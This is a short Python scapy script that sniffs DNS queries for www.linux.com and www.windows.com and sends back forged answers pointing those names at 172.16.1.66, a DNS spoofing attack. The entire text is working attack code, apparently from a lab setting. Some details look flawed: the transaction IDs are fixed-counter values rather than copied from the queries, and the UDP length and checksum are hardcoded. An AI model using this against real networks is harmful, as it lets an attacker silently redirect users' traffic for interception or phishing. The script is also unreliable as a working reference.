#!/usr/bin/python
from scapy.all import *

idDNS = 30000

def dnsMonitorCallBack(pkt):
    if pkt.haslayer(DNS):
        if pkt[DNS][DNSQR].qname == b'www.linux.com.':
            print("packet LINUX received")
            send(NewPacket(pkt))
        if pkt[DNS][DNSQR].qname == b'www.windows.com.':
            print("packet WINDOWS received")
            send(NewPacket(pkt))

def NewPacket(pkt):
    global idDNS
    packet = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport,len=201,chksum=0x4946) / \
             DNS(id=idDNS,qr=1,rd=1,ra=1, qd=DNSQR(qname=pkt[DNS][DNSQR].qname,qtype="A",qclass="IN"), an=DNSRR(rrname=pkt[DNS][DNSQR].qname, type="A", rclass="IN", ttl=267, rdlen=4,rdata="172.16.1.66"))
    packet.show()
    idDNS += 1
    return packet

sniff(prn=dnsMonitorCallBack)